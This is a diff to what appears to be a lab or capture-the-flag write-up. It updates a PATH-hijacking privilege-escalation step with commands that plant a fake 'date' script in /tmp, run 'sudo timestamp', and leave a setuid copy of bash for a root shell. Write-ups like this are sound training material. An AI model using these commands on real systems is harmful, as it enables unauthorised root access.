@@ -10,9 +10,10 @@
 * if the `timestamp` binary is not accessing the `date` command with an absolute filepath, then we can perform PATH hijacking for privilege escalation
 * this means we can run the following commands to create a malicious `date` file in a writable directory:
 ```
-echo '/bin/bash -p' > /tmp/date
+echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /tmp/date
+chmod +x /tmp/date
 export PATH=/tmp:$PATH
 sudo timestamp
+/tmp/rootbash -p
 ```
 * we are root
-* unfortunately we don't have output in this terminal until we exit from it... WIP
